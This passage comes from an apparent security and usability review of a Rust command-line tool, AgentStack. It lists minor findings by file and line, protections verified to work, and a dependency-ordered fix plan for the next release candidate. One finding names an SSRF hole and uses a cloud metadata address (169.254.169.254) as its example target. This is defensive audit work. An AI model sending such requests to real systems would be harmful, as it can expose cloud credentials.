- **Status: ✅ FIXED** 2026-08-01 — `STRATEGY.md`'s header now reads "Current as
  of: AgentStack 0.18.0-rc.1", matching `crates/cli/Cargo.toml`.
- **Confidence:** LOW (CONF D11, known/benign) — fix opportunistically.

---

# NITS (fix opportunistically, do not gate on)

- `undo.rs:194` `"would revert {} change(s)"` — the repo has `count`; a conjugation sweep already landed. (UX)
- Re-gate prompts `a/k/b` then `[y/N]` — two alphabets, no signal the alphabet changed; defensible per the staging contract but a real trip hazard. (UX)
- `doctor.rs:1045` `"↳ rename the file or remove the existing entry"` renders as prose in a copy-pasteable command slot. (UX)
- Collision diff bodies each increment the warning count (one collision → `0 errors, 6 warnings`) — the inflation `doctor.rs:973-975` avoided for secrets one commit earlier. (UX)
- `trust.jsonl` never rotates; `read_trust_all()` parses the whole file on the intake hot path (`intake.rs:601`). Machine-paced, not human-paced. (SEC)
- `share.rs:121` `to_vec(&bare).unwrap_or_default()` — a signature over `b""` would verify; unreachable today, wrong fallback direction. (SEC)
- `ShareBundle` lacks `deny_unknown_fields` — unknown keys aren't signature-covered. (SEC)
- `fetch_url` builds a bare reqwest client, bypassing the `egress` crate's anti-SSRF IP-class checks (`http://169.254.169.254/…` fetches and stages). URL is from argv, so low. (SEC)
- Vocabulary leaks on first contact: two taglines (`cli.rs:40` vs the `--version` banner); `manifest`/`auto-mode`/`skills loadable over MCP`/`[inline, pinned]`/`machine policy ceiling`/`--consented-digest` all reachable in one `yes` on a one-file project; `session` leaks into plain `--help` (`cli.rs:296`); the pin-denial prints two bare 64-char digests and truncates its own next step to `— re…` (`seatbelt.rs:118` 200-char cap) while `verify.rs:348` already has a 12-char abbreviator. (UX)

---

# Do NOT regress — the working core the reviewers could not break

Verified sound and witnessed; keep these intact while fixing the above.

- **Witnesses untouched:** policy ⊆M proptest (`policy/src/lib.rs:278`) + four siblings; trust byte-flip proptest (`trust/src/lib.rs:1241`); D4 sole-dispatch (`sandbox_lockdown.rs:430,467`). Arc-wide: no test removed, none `#[ignore]`'d, no witness file deleted.
- **Recorder discipline exactly right:** `SecretDenied`/`PinRejected` are new variants (not overloaded onto `SecretAccess`/`ToolCall`), `TrustAction::Repin` distinct from `Regrant` so consent metrics exclude repins, payloads identity-only, appended inside the store lock after the write.
- **Trust digest covers lock bytes; attribution carry-forward cannot suppress a re-gate** (checksum always from the incoming entry).
- **`choose()` returns `None` on silence/EOF/ambiguity/read-error**, every caller unchanged — witnessed four ways.
- **`set_decision` is a no-op without a trust entry** (no second grant constructor at that seam); decisions survive an unrelated re-grant; revoke discards them.
- **`Store::pin` is a real choke point** (a `LockedSkill` can't be built without a `Sha256Hex`, obtainable from a `Resolved` only through the depositing call).
- **The `yes` undo row (c11934e) is transactionally honest** — one pre-write `Rollback::capture` converted into the ledger row, promise narrowed to what the row holds, loud warning if recording fails. (Only gap: non-atomic across a SIGKILL between write and record — see F12.)
- **Terminal-escape sanitization** on the trust and eve cards is a real ECMA-48 state machine applied at every render site; `validate_name` is a strict allow-list; no `Command::new` in the new intake code.
- **Key material:** publisher seed 0600 via `write_private`, never logged/serialized/packaged; `share` resolves no secrets.
- **RC mechanics green:** pre-release flag set, `latest` untouched, tap correctly skipped, `install.sh` honors the pin + checksum-verifies, CI green at HEAD, `cargo fmt --check` clean, `cargo check --workspace --all-targets` clean. (Tag is two docs-only commits behind HEAD; hand participants the kit from `main`, not the tag tree.)

---

# Suggested fix order (dependency-aware)

1. **F9** (yes reachability) — smallest, unblocks the study's validity independent of everything else.
2. **Consent-edge integrity:** F5, F6, F4 — the accept/keep-pinned/instruction paths, one coherent slice; F4 and F19's re-hash claim are the same fix.
3. **Enforcement universality:** F7, F8 — the two single-path/decision breaches (invariant-6 class → line-by-line review).
4. **Phase-4 intake hardening:** F1, F2, F3, F14, F16, F17, F13, F15, F18 — the "from anywhere" surface, treated as one hostile-input pass with the type-level lens from the top of this doc.
5. **Honest surfaces:** F10, F11, F12, F19, F20, F21, F22.
6. ~~**Doc/ledger reconciliation:** F23–F30 (no code; fastest, do alongside).~~
   **Done 2026-08-01** — all eight fixed, doc-only, no `.rs` file touched.
7. **Nits:** opportunistic.

Re-cut `v0.18.0-rc.2` only after the BLOCKING set (F1–F11) is fixed and each carries a witness that tampers with the field that actually moved.
